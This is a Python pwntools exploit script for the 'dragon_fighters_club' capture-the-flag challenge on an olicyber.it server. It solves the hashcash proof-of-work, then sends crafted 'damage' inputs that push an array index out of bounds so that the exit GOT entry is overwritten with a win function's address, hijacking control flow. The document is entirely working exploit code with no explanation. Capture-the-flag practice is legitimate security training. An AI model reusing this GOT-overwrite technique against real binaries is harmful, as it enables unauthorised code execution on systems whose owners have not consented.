from pwn import *

if args.REMOTE:
  r = remote("dragonfightersclub.challs.olicyber.it", 38303)
else:
  r = gdb.debug("./build/dragon_fighters_club", """
    b *fight
    continue
  """)
  
damages = {
    0:256,
    1:512,
    2:768,
    3:1280,
    4:6656,
    5:12288,
    6:17664,
    7:40960
}

win_addr = 0x4012C1

exit_at_plt_addr = 0x404050
dragons_addr = 0x4040A0
exit_content = 0x4010B0

difference = (exit_at_plt_addr - dragons_addr)//2//8
damage = exit_content - win_addr

if args.REMOTE:
    r.recvline()
    r.recvline()
    r.recvline()
    to_hash = r.recvline().split(b' ')[-1].decode()
    process = process(f"hashcash -mCb26 {to_hash}", shell=True, stdout=PIPE)

    r.sendline(process.recvline())
    process.close()

for i in range(8):
    print(i)
    print(r.recvuntil(b"> "))
    r.sendline(b"3")
    r.recvuntil(b"> ")
    r.sendline(str(i))
    r.recvuntil(b"?\n")
    r.sendline(str(damages[i]))

for i in range(18):
    print(i+8)
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b"> ")
    r.sendline(b"7")
    r.recvuntil(b"?\n")
    r.sendline(str(damages[7]))
    
r.recvuntil(b"> ")

r.sendline(b"1")
print(r.recvline())

r.recvuntil(b"> ")
r.sendline(b"3")
print(r.recvuntil(b"> "))
r.sendline(str(difference))
print(r.recvuntil(b"?\n"))
r.sendline(str(damage))
print(r.recvuntil(b"> "))
r.sendline((b'6'))
print(r.recv())